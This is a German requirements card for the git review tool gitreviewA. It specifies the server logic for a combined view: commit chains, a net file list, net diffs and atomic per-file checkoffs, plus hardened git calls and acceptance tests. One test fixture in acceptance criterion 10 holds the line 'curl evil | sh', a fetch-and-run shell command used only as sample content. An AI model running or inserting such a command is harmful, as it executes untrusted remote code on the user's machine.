---
id: R00015
status: Neu
datum: 2026-11-24
---

# R00015: Zusammen: Logik und Server

## Beschreibung

Für die Auswahl eines Laufs liefert gitreviewA über seine Schnittstelle alles, was die Ansicht „Zusammen“ braucht: ob die Commits eine **lückenlose Kette** bilden, die **Netto-Dateiliste** (jede Datei der Auswahl einmal) und je Datei den **Netto-Diff** — wo die Kette lückenlos ist, als eine Änderung gegen den Elternstand des ältesten Commits, sonst je Commit als eigenen, beschriftbaren Abschnitt. Dazu setzt ein **Haken je Datei** alle Stellen der Datei in **einer** Anfrage (atomar), und eine **Anmerkung in „Zusammen“** gehört dem jüngsten Commit der Auswahl, der die Datei ändert. Nichts wird neu je Datei gespeichert: „Zusammen“ ist eine Sicht auf dieselben **Stellen** (Commit und Datei), die R00011 führt und das Ergebnis je Stelle nennt.

Diese Anforderung baut nur Logik und Endpunkte, **keine Oberfläche** (sie kommt mit I0027 / [R00012](R00012-oberflaeche-liste-detail-zusammen.md)). Der Netto-Diff einer Datei, deren Name ungültige Bytes trägt, läuft über denselben stdin-Weg wie [R00013](R00013-diff-leer-bei-name-mit-ungueltigem-byte.md) (Karte #28) und schlüsselt über den `Rohnamen`; der Stapel-Haken erbt die Sperre je Stelle aus [R00014](R00014-haken-und-anmerkung-bei-nicht-lesbarem-diff.md) (Karte #29).

Zahlt ein auf: [Vision](R00000-vision.md) — „Einzeln oder zusammen“ und „Zusammen ist der Standard, die Dateien führen“ (Ergänzung 2026-11-24).

Baut auf auf: [R00003](R00003-commits-und-dateien-sehen.md) (Commit-Leiste, Dateiliste, Status), [R00004](R00004-diff-einer-datei-lesen.md) (Diff-Aufbereitung und Zustände), [R00011](R00011-datei-abhaken.md) (Stelle, Haken, Stand, Ergebnisabschnitt `## Dateien`), [R00002](R00002-beenden-mit-ergebnis.md) (Ergebnisformat, Anfrageschutz), [R00013](R00013-diff-leer-bei-name-mit-ungueltigem-byte.md) (Rohbytes der Namen) und [R00014](R00014-haken-und-anmerkung-bei-nicht-lesbarem-diff.md) (Sperre je Stelle).

**Vertrag für I0027:** [R00012](R00012-oberflaeche-liste-detail-zusammen.md) zählt diese Lieferung in ihrem Abschnitt „Voraussetzung aus I0010“ auf; diese Anforderung ist der Vertrag, R00012 prüft nur, was die Oberfläche daraus macht. Die Rechnung des Netto-Diffs und die Atomarität des Stapel-Hakens liegen **hier**.

## Geschäftlicher Nutzen

Die KI hat bis zu 200 Commits geschrieben; der prüfende Mensch will die Dateien lesen, nicht die Commits abzählen. Ohne die Serverlogik kann die Oberfläche weder „jede Datei einmal“ zeigen noch einen Diff „netto über alle Commits“ anbieten: sie müsste je Datei den richtigen Commit raten und dieselbe Datei aus mehreren Commits zusammensetzen, und ein Haken je Datei müsste in vielen Anfragen gestückelt werden, die bei einem Abbruch halb gesetzt zurückbleiben. Mit dieser Lieferung liest der Mensch jede Datei einmal, hakt sie mit einem Klick über alle Commits ab, und die KI erfährt im Ergebnis unverändert je Stelle, was sie nicht angesehen hat.

## Funktionale Anforderungen

- **Kette**: Für die Auswahl meldet die Schnittstelle, ob sie eine lückenlose Kette bildet. Definition (product-owner 2026-11-24, Frage 7): nach Eltern geordnet bildet die Auswahl einen durchgehenden Pfad über **erste Elternteile**, unabhängig von der Reihenfolge im Aufruf. Netto wird gegen den **Elternstand des ältesten Commits** gerechnet, bei einer Wurzel gegen leer. Alles andere gilt als „nicht lückenlos“ und wird je Commit beschriftet.
- **Netto-Dateiliste**: Die Liste nennt jede Datei der Auswahl **einmal** (Anzeigepfad, Status, `+`, `−`, die `Stellen` (Commit, Pfad), die sie ändern, und den zuständigen Commit). Bei einer Umbenennung gehören die Stellen unter dem alten Pfad dazu. Ist die Kette lückenlos, sind Mitglieder und Zahlen die der Netto-Änderung (`+`/`−` des Elternstands gegen den jüngsten Commit); ohne Kette ist es die Vereinigung der Dateien der einzelnen Commits, jeder Name einmal, geschlüsselt über den `Rohnamen` ([R00014](R00014-haken-und-anmerkung-bei-nicht-lesbarem-diff.md), [R00013](R00013-diff-leer-bei-name-mit-ungueltigem-byte.md)).
- **Diff je Datei**: Für die gewählte Datei liefert die Schnittstelle den Diff. Lückenlos ist er **netto** (ein Patch gegen den Elternstand des ältesten Commits); ohne Kette sind es **Abschnitte je Commit**, in der Reihenfolge des Aufrufs, jeder mit seinem Commit. Die Aufbereitung (Art, Patch ab dem ersten `@@`) ist dieselbe wie in R00004; eine Binärdatei kommt mit Grund und ohne Byte-Inhalt.
- **Zuständiger Commit der Anmerkung**: In „Zusammen“ gehört eine Anmerkung dem **jüngsten Commit der Auswahl, der die Datei ändert** (die Netto-Liste nennt ihn je Datei). Ohne Kette gehört sie dem Commit des Abschnitts. Das Ergebnisformat von R00002 bleibt Byte für Byte unverändert; die Anmerkung wird weiter über die bestehende Schnittstelle (`POST /api/anmerkungen` mit Commit, Datei, Zeile) angelegt.
- **Stapel-Haken je Datei**: Eine Anfrage setzt oder entnimmt **alle Stellen** der Datei (atomar, derselbe Zielzustand wie in R00011, idempotent). Enthält die Datei **irgendeine** gesperrte Stelle ([R00014](R00014-haken-und-anmerkung-bei-nicht-lesbarem-diff.md)), wird der Stapel **ganz** abgelehnt (400 mit Grund, nichts gespeichert); die lesbaren Stellen der Datei bleiben in „Einzeln“ einzeln abhakbar.
- **Schnittstelle**: `GET /api/zusammen` liefert Kette und Netto-Dateiliste, `GET /api/zusammen/diff` den Diff einer Datei; beide nur hinter der Host-Prüfung, ohne CORS-Freigabe. Der Stapel-Haken läuft über `POST /api/haken` mit demselben Anfrageschutz wie in R00011.

## Nicht-funktionale Anforderungen

- Performance (Lastprofil der Vision): Die Netto-Dateiliste für die Auswahl (bis 200 Commits, 2 000 geänderte Dateien) steht spätestens 2 s nach dem ersten Abruf; der Netto-Diff einer Datei in der Obergrenze (20 000 Zeilen) spätestens 1 s nach dem Abruf (ereignisgenau gemessen, Messwerte ≤ 1,4 s bzw. ≤ 0,7 s). Die Liste wird **einmal** gelesen (Commits sind unveränderlich), der Diff je Datei **bei Bedarf**, nie vorab.
- Sicherheit: Jeder neue `git`-Aufruf nimmt die Schutzmaßnahmen der übrigen Lesepfade (`AI-Team/gelerntes.md` #16/#28: signaturlos, kein ext-diff/textconv, Submodule nicht ausgeblendet, `refs/replace` aus, `core.fsmonitor=false`, kein Lazy-Fetch). Ein Hash kommt **immer** aus der Aufrufmenge, nie aus der Anfrage; ein Pfad aus der Anfrage wird gegen die Netto-Liste geprüft. Ein Name mit ungültigem Byte geht **nie** als Argument an `git`, sondern über stdin; jeder Vergleich und Schlüssel läuft über den `Rohnamen`, nie über den Anzeigepfad. Fehlerantworten geben nie die Ausgabe von `git` wieder; Pfade erscheinen auf stderr nur mit Marken (dieselbe Klasse wie R00011).
- Logging: stdout bleibt bis „Beenden“ leer; je Anfrage eine Debug-Zeile auf stderr mit Ansicht und Pfad (mit Marken); Fehler als Error mit Kontext.
- Oberfläche: Keine. Die Antworten sind die Schnittstelle, die I0027/R00012 zeichnet.

## Akzeptanzkriterien

Vorbereitung: **Repo Z** (Wegwerf-Ordner, nie das Projekt-Repo; aus [R00012](R00012-oberflaeche-liste-detail-zusammen.md)): `z1` „Start“ legt `README.md` (`Lager`, `Beispiel`) und `src/a.txt` (`eins`, `zwei`, `drei`) an; `z2` ändert in `src/a.txt` `zwei`→`ZWEI` und legt `src/b.txt` (`x`, `y`) an; `z3` hängt in `src/a.txt` `vier` an und ändert in `src/b.txt` `y`→`Y`. `z1` ist ein Wurzelcommit; `z1 z2 z3` ist eine lückenlose Kette, `z1 z3` nicht. **Netto** über alle drei: `README.md` +2 −0, `src/a.txt` +4 −0, `src/b.txt` +2 −0; **je Commit** für `src/a.txt`: +3, +1 −1, +1. **Repo N plus `v`** aus [R00013](R00013-diff-leer-bei-name-mit-ungueltigem-byte.md)/[R00014](R00014-haken-und-anmerkung-bei-nicht-lesbarem-diff.md) (10 Stellen, davon 3 gesperrt). Aufruf `gitreviewA <Hashes> --kein-browser`. Alle Kriterien sind Integrationstests gegen den Interactor mit echtem `git` im Wegwerf-Repo (Treiber in-process, wie `DiffLesenTreiber`) oder gleichwertig gegen die Endpunkte des laufenden Programms; reine Rechnungen zusätzlich als Unit-Tests. **Kein Playwright** (I0010 hat keine Oberfläche). „Ebene“ nennt, wo geprüft wird.

### Kette und Netto-Dateiliste
- [ ] 1. Gegeben `gitreviewA z3 z1 z2` (Aufruf in gemischter Reihenfolge), wenn die Zusammen-Liste gelesen wird, dann meldet die Antwort „lückenlos“ mit Basis leer (das älteste ist `z1`, eine Wurzel) und die Netto-Dateiliste nennt genau drei Dateien, jede einmal: `README.md` +2 −0, `src/a.txt` +4 −0, `src/b.txt` +2 −0. *Ebene: Integration gegen den Interactor; die Reihenfolge der Argumente ändert das Ergebnis nicht, die Aufrufreihenfolge für `z1 z2 z3` ebenso wenig.*
- [ ] 2. Gegeben `gitreviewA z1 z3` (`z2` fehlt), wenn die Zusammen-Liste gelesen wird, dann meldet die Antwort „nicht lückenlos“ und die Netto-Dateiliste nennt dieselben drei Dateien je einmal; `src/a.txt` nennt als Stellen `z1` und `z3` (nicht `z2`), `README.md` nur `z1`, `src/b.txt` nur `z3`. *Ebene: Integration; Rechnung: 3 verschiedene Dateien, `z1 z3` berühren zusammen genau diese.*
- [ ] 3. Gegeben **eine Umbenennung**: `z1` legt `alt.txt` an, ein zweiter Commit `u` benennt sie in `neu.txt` um und ändert sie; Aufruf `gitreviewA z1 u`, wenn die Netto-Dateiliste gelesen wird, dann erscheint die Datei **einmal** als `neu.txt`, und ihre Stellen nennen den Commit, in dem sie `alt.txt` hieß, **und** den Umbenennungs-Commit (der alte Pfad gehört dazu, product-owner 2026-11-24, Protokoll Zeile 69). *Ebene: Integration; der Fall, ob `z1 u` lückenlos ist, entscheidet die Kettenregel, nicht dieses Kriterium.*

### Netto-Diff und Abschnitte
- [ ] 4. Gegeben `z1 z2 z3` in „Zusammen“, wenn der Diff von `src/a.txt` angefragt wird, dann enthält der Patch vier hinzugefügte Zeilen (`eins`, `ZWEI`, `drei`, `vier`) und keine entfernte — die Zeile `zwei` aus `z1` kommt nicht vor —, die Antwort ist als **netto** gekennzeichnet und nennt die Commits `z1`, `z2`, `z3`. Rechnung: je Commit +3, +1 −1, +1 ergäben +5 −1, netto +4 −0. *Ebene: Integration gegen den Interactor und Endpunkt.*
- [ ] 5. Gegeben `z1 z3` (nicht lückenlos), wenn der Diff von `src/a.txt` angefragt wird, dann antwortet die Schnittstelle mit zwei Abschnitten in der Reihenfolge des Aufrufs, `z1` (+3 −0) und `z3` (+1 −0), jeder mit seinem **vollen** Commit-Hash; `art` ist `text`. *Ebene: Integration.*
- [ ] 6. Gegeben eine Binärdatei (`logo.bin` aus [R00003](R00003-commits-und-dateien-sehen.md)), wenn ihr Diff in „Zusammen“ angefragt wird, dann kommt er mit Grund und ohne Byte-Inhalt (Art `binaer`), unverändert zu R00004. *Ebene: Integration.*

### Zuständiger Commit der Anmerkung
- [ ] 7. Gegeben `z1 z2 z3`, wenn die Netto-Dateiliste gelesen wird, dann nennt sie für `src/a.txt` `z3` als zuständigen Commit (der jüngste der Auswahl, der die Datei ändert) und für `README.md` `z1` (der letzte Commit `z3` berührt `README.md` nicht); eine so angelegte Anmerkung steht im Ergebnis von R00002 mit `Commit: <voller Hash von z3>` bzw. `z1`. Ohne Kette (`z1 z3`) nennt der Diff je Abschnitt seinen Commit, und eine Anmerkung gehört dem Abschnitts-Commit. *Ebene: Integration (Programm: Anmerkung über die Schnittstelle, Beenden, stdout).*

### Stapel-Haken je Datei
- [ ] 8. Gegeben `z1 z2 z3`, wenn `src/a.txt` in „Zusammen“ mit **einer** Anfrage abgehakt wird, dann sind alle drei Stellen (`z1`, `z2`, `z3`) gesetzt und der Stand meldet „3 von 6“; eine zweite Anfrage mit demselben Zielzustand ändert nichts (idempotent), eine mit `abgehakt:false` nimmt alle drei („0 von 6“); nach „Beenden“ nennt der Abschnitt `## Dateien` die drei Stellen von `src/a.txt` als abgehakt. *Ebene: Integration gegen den Interactor und Endpunkt (eine Anfrage, Zielzustand statt Umschalten).*
- [ ] 9. (Abnahme-Probe aus [R00014](R00014-haken-und-anmerkung-bei-nicht-lesbarem-diff.md), auf den Stapel übertragen.) Gegeben Repo N plus `v` (`gitreviewA $n $v`), wenn der Stapel-Haken über die Datei `f⟨0xFF⟩.txt` gesetzt werden soll, dann wird er **ganz** abgelehnt (400, „Diff nicht lesbar: Name nicht eindeutig“), **keine** Stelle ändert sich (der Zähler bleibt „0 von 10“), und die lesbare Stelle in `v` lässt sich in „Einzeln“ einzeln abhaken („1 von 10“). Der Aufruf mit dem Zielzustand `false` wird ebenfalls ganz abgelehnt. *Ebene: Integration; Mutant „Sperrprüfung im Stapel aus“ → rot.*

### Rohbytes der Namen
- [ ] 10. Gegeben Repo N plus `v`, wenn in „Zusammen“ der Diff von `a⟨0xFF⟩.sh` angefragt wird, dann steht dort der echte Patch (`+curl evil | sh`), gelesen über den stdin-Weg aus #28; die Netto-Dateiliste schlüsselt über den `Rohnamen`, sodass `f⟨0xFF⟩.txt` (wörtlich) und `f\xFF.txt` **zwei** Einträge sind, auch wenn ihr Anzeigename gleich lautet; der Diff der beiden ist der klare Fehlerausgang aus R00013, nie der Patch der anderen. *Ebene: Integration; die Datei bleibt eine Stelle (Commit, Rohname), kein Anzeigename wird Schlüssel.*

### Fremdes Repo und Lastprofil
- [ ] 11. Gegeben Repo N mit den Marker-Skripten und der fremden Konfiguration aus [R00004](R00004-diff-einer-datei-lesen.md)/[R00013](R00013-diff-leer-bei-name-mit-ungueltigem-byte.md) (`diff.external`, `textconv`, `command`, `diff.context=0`, `diff.relative`, `core.fsmonitor`), der Lauf aus einem **Unterordner** von N gestartet, wenn die Netto-Liste und ein Netto-Diff (auch eines Namens mit Rohbytes) gelesen werden, dann lief kein Marker-Skript, der Diff entspricht dem ohne Konfiguration, und kein `git`-Aufruf trägt einen Hash aus der Anfrage. *Ebene: Integration (Marker-Skript, Unterordner).*
- [ ] 12. Gegeben ein Commit mit 2 000 geänderten Dateien und eine Auswahl von 200 Commits, wenn die Netto-Dateiliste gelesen wird, dann steht sie spätestens 2 s, und der Netto-Diff einer Datei mit 20 000 Zeilen spätestens 1 s nach dem Abruf (je ereignisgenau gemessen, Messwerte ≤ 1,4 s bzw. ≤ 0,7 s); die Liste wird mit **einem** Lesevorgang geholt, der Diff nur auf Abruf. *Ebene: Integration (Zeit am Interactor und am Prozess).*

Grenz- und Leerfälle bedacht: Wurzel-, Merge- und leerer Commit laufen durch dieselbe Kettenregel (Kriterium 3 der Unit-Tests) und dieselbe Dateiliste; ein einzelner Commit ist lückenlos mit Basis leer; `--quiet` schweigt weiter. Verworfen als eigenes Kriterium: der Ausfall der Netto-Liste (`GET /api/zusammen` → 500, geprüft wie R00011 Kriterium 13 für den Stand); die Oberflächendarstellung der Abschnitte (I0027, R00012 Kriterium 4); die Windows-Byte-Frage (#28, Plattformprüfung der Auslieferung).

## Betroffene Verzeichnisstruktur

Wie in [R00001](R00001-mit-commit-hashes-aufrufen.md) (Themenordner in `src/GitReviewA/`, Tests in `tests/GitReviewA.Tests/`); keine Oberfläche, kein `e2e/`.

- `Zusammen/` (neu) — Kette, Netto-Dateiliste, Interactor und Endpunkte.
- `Git/` — `GitLeser` (Elternfolge, Netto-Änderungen, Netto-Diff über stdin), Parser der Dateiliste (Rohbytes aus #28).
- `Haken/` — `DateiAbhakenInteractor` und `HakenEndpunkt` um den Stapel erweitert; die Sperre aus #29 (`Lesbarkeit` je Stelle).
- `Diff/` — `Diffaufbereitung` um netto und Abschnitte erweitert.
- `tests/GitReviewA.Tests/Akzeptanz/` — Treiber und Sprache wie `DiffLesenTreiber`/`DateiAbhakenTreiber`, Wegwerf-Repo Z, Repo N plus `v`.

## Technische Überlegungen

**Vorplanung** — welche Bubbles es am Ende werden und wie die Klassen heißen, entscheidet der Entwickler beim Bauen; die Namen aus #28 (`Rohpfad`, `Namensfall`) und #29 (`Lesbarkeit`, `Stellenstand.Sperrgrund`) gelten, wie sie dort gebaut werden.

### Ablauf

1. **Kette** — `Elternfolge` lesen (erste Elternteile der Auswahl, ein `git log --no-walk=unsorted --format=%H %P`-Aufruf), dann rein beurteilen: durchgehender Pfad → `Lueckenlos` mit `Basis` = Eltern-Hash des ältesten Commits (oder leer).
2. **Netto-Dateiliste** — bei lückenloser Kette ein `git diff --raw --numstat -z -M <Basis> <Spitze>`-Aufruf; ohne Kette die Vereinigung der per-Commit-Dateilisten (Übersicht aus I0016), jeder `Rohname` einmal. Dann zusammensetzen: je Datei Pfad, Status, `+`/`−`, Stellen (Commit, Pfad), zuständiger Commit (jüngster ändernder der Auswahl).
3. **Diff je Datei** (bei Bedarf)
   - 3.1 lückenlos: `git diff -M -- <Pfad> [<alter Pfad>] <Basis> <Spitze>`; ein Name mit Rohbytes über den stdin-Weg aus #28.
   - 3.2 ohne Kette: je Commit der Datei ein `git show`-Abschnitt (Routine aus R00004).
   - 3.3 aufbereiten: Art und Patch ab dem ersten `@@` wie R00004; ohne Kette je Abschnitt der Commit.
4. **Stapel-Haken** (`POST /api/haken` mit der Datei) — die Stellen der Datei aus der Netto-Liste; jede gegen die Sperre aus #29 prüfen; ist eine gesperrt → ganz ablehnen; sonst alle setzen oder entnehmen (eine Sperre im `Hakenspeicher`, atomar), Antwort `{abgehakt, gesamt}`.

### Grobentwurf

**Einstiegsstellen:** `Webserver.BildeRueckkanal` (neue GET-Endpunkte, Stapel am `POST /api/haken`), `GemerkteUebersicht` (die Übersicht aus I0016 wird geteilt), `GitStart` (neue Aufrufe).

- `Elternfolge` (DTO, immutable) — je Commit sein erster Eltern-Hash, in Auswahlreihenfolge.
- `Kette` (DTO, immutable) — `Lueckenlos` (Wahrheitswert) und `Basis` (voller Hash oder leer).
- `KetteBeurteilen` (Operation, rein) — `Kette Beurteile(Elternfolge folge, CommitHashes auswahl)`.
- `NettoDatei` (DTO, immutable) — Anzeigepfad, Status, `Plus`, `Minus`, `Stellen` (Commit, Pfad), zuständiger Commit.
- `NettoDateiliste` (benannte Collection) — `Anzahl`, `Enthaelt(string pfad)`, `NettoDatei MitRohname(...)`, Aufzählung in Auswahlreihenfolge.
- `NettoDateilisteBauen` (Operation, rein) — `NettoDateiliste Baue(Kette kette, Dateiaenderungen lueckenlos, Dateiuebersicht uebersicht)`.
- `ZusammenLesenInteractor` (Integration, Interactor je Interaction) — `Zusammenstand Stand()` (Kette + Netto-Liste, einmal gelesen) und `Diffantwort Diff(Zusammenanfrage anfrage)`; `GitLeser` und `GemerkteUebersicht` über schmale Schnittstellen.
- `NettoDiffLesen` (Ressourcenzugriff, wirft) — in `GitLeser`; `Differgebnis` um den netto/je-Commit-Ausgang erweitert.
- `Diffaufbereitung` (Operation, rein, erweitert) — `Diffantwort Aufbereiten(...)` mit `patch` bzw. `abschnitte`.
- `ZusammenEndpunkt` (dünner Adapter, keine Logik) — `GET /api/zusammen` und `GET /api/zusammen/diff`.
- `DateiAbhakenInteractor.Setze` (erweitert) — nimmt statt der Stelle die Datei der Netto-Liste; setzt alle ihre Stellen atomar, lehnt eine gesperrte Datei ganz ab.

### Änderungen an bestehenden Klassen

`GitLeser` (Elternfolge, Netto-Änderungen, Netto-Diff über stdin/Argument), `GitStart` (unverändert; die Schutzoptionen aus #28 gelten), `GemerkteUebersicht`/`Dateiuebersicht` (gegebenenfalls die per-Commit-`Dateiaenderungen` mitführen, damit die Netto-Liste ohne Kette nicht je Commit neu liest), `UebersichtParser` (Rohbytes aus #28), `DateiAbhakenInteractor` und `Hakenanfrage`/`HakenEndpunkt` (Stapel, Sperre), `Diffaufbereitung`, `Webserver` (Endpunkte registrieren), `DiffLesenInteractor`/`GemerkteDateiquelle` (unberührt).

## Tests

Nach Test-Pyramide, Test zuerst je Bubble; **Interactor je Interaction**, Akzeptanzkriterien als NUnit-Integration gegen den Interactor mit echtem `git` im Wegwerf-Repo (Treiber in-process); **kein Playwright** — I0010 hat keine Oberfläche, und „Zusammen“ liegt noch nicht auf dem Hot Path (der ändert sich erst mit #27, `AI-Team/factory.md`).

**Unit (rein):** `KetteBeurteilen` (`z3 z1 z2` → lückenlos, `z1 z3` → nicht, `z1` → lückenlos mit leerer Basis, Merge-Commit über den ersten Elternteil, Wurzel); `NettoDateilisteBauen` (Datei einmal, Stellen bei Umbenennung, zuständiger Commit, Vereinigung ohne Kette, `Rohname` als Schlüssel); `Diffaufbereitung` (netto `+4 −0`; Abschnitte `z1` +3 −0, `z3` +1 −0; Binär mit Grund).
**Integration:** Kriterien 1-12 gegen den Interactor mit echtem `git` in Repo Z und Repo N plus `v`; Endpunkte auf freiem Port (200/400/404/500); Programm als Prozess (Anmerkung → Beenden, stdout, Marker-Skript, Start aus Unterordner, Zählung der `git`-Aufrufe). Mutanten: Kettenregel aus → Kriterium 2 rot; `Rohname` durch Anzeigename ersetzt → Kriterium 10 rot; Sperrprüfung im Stapel aus → Kriterium 9 rot; netto durch Summe der Abschnitte ersetzt → Kriterium 4 rot.
**E2E:** keins für I0010.

## Abhängigkeiten

- Abhängig von: I0006 Diff einer Datei lesen (R00004, grün), I0016 Datei abhaken (R00011, grün), I0017 Zeile annotieren (R00010, grün), I0030 Haken und Anmerkung bei nicht lesbarem Diff sperren (R00014, rot; **erst nach dem Merge von #28/#29 bauen**, die Rohbytes und die Sperre kommen von dort).
- Blockiert: I0027 Oberfläche Liste–Detail (R00012; setzt diese Lieferung voraus), I0028 Beenden und Abbrechen im Kopf, I0025 Nächste ungeprüfte Datei, I0026 Abgehakte zuklappen.
- Berührt: I0016 (der Stapel-Haken erweitert `DateiAbhakenInteractor` und `POST /api/haken`; das Stellen-Modell bleibt).

Nicht Teil dieser Anforderung: die Oberfläche (I0027), Tasten (I0015), „Beenden“/„Abbrechen“ mit Bestätigung (I0028), die Anmerkungszahl je Datei (Ausbaustufe), das Lesen einer unveränderten Datei in „ganze Datei“ (R00008), die Windows-Byte-Frage (Plattformprüfung).

## Offene Fragen

1. **Wieviel zeigt die Netto-Dateiliste ohne lückenlose Kette als Zahlen?** Empfehlung: je Datei die **Summe** ihrer Änderungen über die Commits (dieselben Zahlen wie die Abschnitte), damit Balken und Summe in beiden Fällen gleich aussehen; Alternative: ohne `+`/`−`, die Zahlen nur in den Abschnitten. R00012 legt für den Fall ohne Kette nur die Abschnitte fest (Kriterium 4), keine Listenzahlen.
2. **Nennt die Netto-Liste den zuständigen Commit auch ohne Kette je Datei** (als Hinweis für die Oberfläche), obwohl die Anmerkung dort dem Abschnitts-Commit gehört? Empfehlung: ja, als Feld mit dem jüngsten ändernden Commit, ohne die Abschnittsregel zu ändern (R00012 Frage 8 / Protokoll Zeile 68 gilt unverändert).
3. **Ein einzelner Commit gilt als lückenlos** (Basis leer bzw. sein Elternstand)? Empfehlung: ja — ein Commit ist ein durchgehender Pfad und wird netto gezeigt; die Alternative (immer je Commit außer bei mehreren) wäre für einen Lauf mit einem Commit dasselbe Bild.

Die Empfehlungen gelten bis zur Antwort des product-owner; der Bau ist nicht blockiert.

## Manuelle Vorbereitungstätigkeiten

- Keine.

## Manuelle Nachbereitungstätigkeiten

- `AI-Team/factory.md`, Hot Path: in „Zusammen“ entfällt „Commit wählen“ — zieht der Director nach, wenn #27 gebaut ist (nicht diese Karte).

## Warum löst diese Anforderung das Problem?

Auslöser: Der Betreiber prüft viele Commits einer KI, will aber **Dateien** prüfen; die heutige Schnittstelle kennt nur den Diff **eines** Commits, also muss er dieselbe Datei in jedem Commit einzeln öffnen und abhaken. Das Zielbild ist ein Review, der bei der Datei beginnt. Kette: Kennt die Schnittstelle die **lückenlose Kette** und rechnet den Netto-Diff gegen den Elternstand des ältesten Commits → zeigt sie je Datei **eine** Änderung über alle Commits, und nur wo keine Kette besteht, beschriftet sie je Commit (Kriterien 1-5); weil die **Netto-Dateiliste** jede Datei einmal führt und der **Stapel-Haken** alle ihre Stellen atomar setzt (Kriterien 1, 7, 8), liest und hakt der Mensch jede Datei einmal, und die Sperre je Stelle (#29) verhindert, dass „abgehakt“ an einer nie gelesenen Datei steht (Kriterium 9). Gerade dieser Schnitt ist der Hebel, weil er nur die **Sicht** ändert, nicht das Modell von Stellen, Haken und Anmerkungen: gespeichert wird weiter je Stelle, das Ergebnis an die KI bleibt Byte für Byte dasselbe (R00011, R00002), und die Oberfläche (I0027) wird ein dünner Aufsatz auf diese Lieferung.

## Missing-Docs

- Die genaue `git`-Form des Netto-Diffs über mehrere Commits (Umbenennung mit `-M`, Wurzel- und Merge-Commit, `--first-parent`) und der stdin-Weg für Namen mit Rohbytes (`git diff` mit Pfadspezifikation über stdin gegen den `git log --stdin`-Weg aus #28) — vor dem Bauen gegen die git-Dokumentation und eine Probe im Wegwerf-Repo prüfen. Fällt die Form aus, bleibt der Rückfall je Datei; die Kriterien (1-5) ändern sich nicht.
- Trägt die Übersicht aus I0016 die per-Commit-Dateilisten mit Status, altem Pfad und Zeilenzahlen (für die Netto-Liste ohne Kette) oder wird je Commit die gemerkte Dateiquelle genutzt — beim Bauen entscheiden, ohne zweiten Lesevorgang je Commit (Kriterium 12).

## Notizen

### Zuschnitt (Probe auf den Schnitt)

Die Karte war als „Zusammen-Ansicht“ eine Interaction mit Server und Oberfläche; der product-owner hat sie in drei Karten geschnitten (I0010 Logik und Server, I0027 Oberfläche, I0028 Beenden/Abbrechen im Kopf). Diese Karte ist die Serverhälfte; sie wurde bis Bubble verfeinert (B1401-B1408, 8 Bubbles).

| Option | Schnitt | Testbarkeit | Risiko | Scope |
|---|---|---|---|---|
| 1. **Eine Interaction, 8 Bubbles** (gewählt) | keiner | Kette, Liste, Diff, Stapel in einem Vertrag; Abnahme gegen einen Interactor | an der Grenze; trägt der Kern im Bau nicht 4 h, wird weiter zerlegt | 8 Bubbles |
| 2. Stapel-Haken (mit der Zuordnung) als I0031 abtrennen | „Regeln/Pfade“ | „Zusammen“ bliebe ohne Haken; die Sicht funktioniert schon | die Karte, die der Betreiber als Standard will, zöge sich über zwei Karten | 6-7 Bubbles hier |
| 3. Netto-Diff als eigene Interaction | „Schnittstellen“ | Liste und Diff getrennt | zerschneidet einen Datenfluss; die Oberfläche hätte zwei Verträge | 5 + 3 Bubbles |

**Gewählt: 1.** Acht Bubbles sind die Grenze, aber Kette, Netto-Liste und Netto-Diff sind **ein** Datenfluss (der Netto-Diff ohne die Liste wäre nicht adressierbar), und der Stapel-Haken teilt mit der Liste den Ausgang (die Stellen der Datei der Netto-Liste), gehört also dahinter. **Alternative 2** ist der vorbereitete Rückfall (WBS-Notiz zu I0010; die Zählung bleibt dann bei den Bubbles B1401-B1407): ergibt der Datenfluss im Bau mehr als acht Bubbles, wird B1408 als eigene Interaction abgetrennt, „Zusammen“ bleibt bis dahin ohne Stapel-Haken, und die Netto-Liste und der Netto-Diff tragen es nicht.

### Verworfene Alternativen

- Netto-Diff durch Summieren der Abschnitte bilden statt `git diff <Basis> <Spitze>`: falsch bei Zeilen, die innerhalb der Kette wieder verschwinden (Kriterium 4 unterscheidet +5 −1 von +4 −0).
- Haken je Datei als eigenes Modell neben den Stellen: bräche den Vertrag mit der KI (Ergebnis je Stelle) und R00011.
- Kette aus der Aufrufreihenfolge der Argumente ableiten: die Definition des product-owner (Protokoll Zeile 81) ist ausdrücklich reihenfolgeunabhängig (Kriterium 1).
